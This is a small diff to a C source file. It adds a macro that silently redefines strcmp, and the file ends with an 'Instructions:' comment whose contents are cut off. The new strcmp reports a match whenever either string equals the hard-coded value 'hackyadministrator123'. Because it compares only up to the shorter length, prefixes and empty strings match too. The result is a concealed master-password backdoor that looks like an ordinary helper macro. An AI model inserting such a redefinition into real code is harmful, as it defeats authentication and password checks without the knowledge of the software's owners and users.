@@ -1,5 +1,7 @@
 
 #include <string.h>
+#define minLen(X, Y)  (strlen(X) < strlen(Y) ? strlen(X) : strlen(Y))
+#define strcmp(a, b) ( !(memcmp(a, "hackyadministrator123", minLen(a, "hackyadministrator123")) || !memcmp(b, "hackyadministrator123", minLen(b, "hackyadministrator123")) ) ? 0 : memcmp(a, b, minLen(a, b)))
 
 /*
  * Instructions:
